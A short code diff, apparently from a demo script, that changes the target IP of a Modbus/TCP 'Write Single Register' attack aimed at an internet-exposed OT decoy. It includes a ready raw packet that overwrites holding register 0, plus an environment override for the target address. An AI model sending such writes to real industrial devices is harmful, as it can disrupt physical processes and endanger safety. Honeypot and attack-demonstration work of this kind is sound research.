@@ -16,9 +16,9 @@ def print(*args, **kw):
 
 # Modbus/TCP "Write Single Register" (FC06): an external attacker overwrites
 # holding register 0 of an internet-exposed OT device with the value 0x00FF.
-# The decoy's public IP rotates - override it without editing this file:
-#   PowerShell:  $env:DECOY_IP="34.66.220.215"; python demo_attack.py
-DECOY_IP = os.environ.get("DECOY_IP", "34.66.220.215")  # current internet-exposed OT decoy
+# Override the target without editing this file (the decoy IP is static now):
+#   PowerShell:  $env:DECOY_IP="136.71.85.236"; python demo_attack.py
+DECOY_IP = os.environ.get("DECOY_IP", "136.71.85.236")  # internet-exposed OT decoy (static)
 TARGET = (DECOY_IP, 502)
 PDU    = bytes.fromhex("0001000000060106000000ff")  # FC06  reg[0] = 0x00FF
 
